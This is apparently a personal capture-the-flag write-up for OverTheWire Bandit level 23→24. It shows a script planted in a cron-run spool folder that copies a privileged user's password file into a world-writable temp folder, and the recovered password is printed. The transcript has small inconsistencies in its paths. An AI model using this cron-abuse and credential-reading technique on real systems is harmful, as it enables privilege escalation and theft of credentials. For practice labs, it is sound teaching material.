# Bandit lvl 23 → lvl 24

Tags: 
Date:


# Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# Approach


## Output / Result
checking out the .sh file
```bash
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
its showing script running by the system as bandit24 and deleting all files in `/var/spool/$myname/foo` at a set interval

since it looks like we need to make another file lets make a tmp dir where we can work out of and give the folder proper permissions

```bash
bandit23@bandit:/etc/cron.d$ mkdir /tmp/dir000
bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/dir
bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/dir000
bandit23@bandit:/etc/cron.d$ cd /tmp/dir000
```

working out of our dir lets make a hidden script that we are going to inject into the `cronjob_bandit24.sh`
```bash
bandit23@bandit:/tmp/dir000$ touch .script.sh
bandit23@bandit:/tmp/dir000$ echo '#!/bin/bash' > .script.sh
bandit23@bandit:/tmp/dir000$ echo 'cat /etc/bandit_pass/bandit24 > /tmp/dir000/bandit24' >> .script.sh
bandit23@bandit:/tmp/dir000$ chmod +x .script.sh   (give our script execution permissions)
bandit23@bandit:/tmp/dir000$ cat .script.sh 
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/dir000/bandit24
bandit23@bandit:/tmp/dir000$ cp .script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/dir000$ cat .script.sh 
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/dir/bandit24
```
after some time we will see that the file from /etc/bandit_pass/bandit24 will show up in our working terminal

```bash
bandit23@bandit:/tmp/dir000$ ls
bandit23@bandit:/tmp/dir000$ ls
bandit24
bandit23@bandit:/tmp/dir000$ cat bandit24 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
bandit23@bandit:/tmp/dir000$ 
```
# Commands user
* cd 
* cat
* mkdir
* chmod
* ls
* 